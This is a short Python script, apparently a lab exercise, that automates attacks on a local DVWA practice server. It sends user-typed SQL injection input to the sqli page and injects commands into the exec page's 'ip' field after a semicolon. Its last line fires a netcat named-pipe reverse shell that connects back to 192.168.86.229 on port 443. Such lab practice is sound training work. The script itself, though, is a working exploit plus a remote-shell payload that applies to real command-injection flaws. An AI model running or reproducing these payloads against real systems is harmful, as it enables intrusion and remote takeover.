#!/usr/bin/python3

import requests

from bs4 import BeautifulSoup

def sql_injection(): # Esta funcion se encarga de automatizar el sql injection
	sql_i = input("sqli> ")

	datos = {
		"id": sql_i,
		"Submit": "Submit"
		}

	r = requests.get(url_sql_injection, params = datos, cookies = cookie)

	soup = BeautifulSoup(r.text)

	print(soup.text.split('<pre>'))
def command_execution(cmd):
	datos = {"ip": "192.168.86.229;" + cmd,
			"submit": "submit"}
	r = requests.post(url_rce, data = datos, cookies = cookie) # para enviar datos por post entonces usar data

	print(r.text)

phpsessid = "bd93dc05bcb14347acc323c2a52b778a"

url = "http://192.168.86.39/dvwa/index.php"

url_sql_injection = "http://192.168.86.39/dvwa/vulnerabilities/sqli/"

url_rce = "http://192.168.86.39/dvwa/vulnerabilities/exec/"

cookie = {
	"PHPSESSID": phpsessid,
	"security": "low"
}

#r = requests.get(url, cookies = cookie)
#r = requests.get(url, headers = {"Cookie":"security=high;PHPSESSID=bd93dc05bcb14347acc323c2a52b778a"})

command_execution("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.86.229 443 >/tmp/f")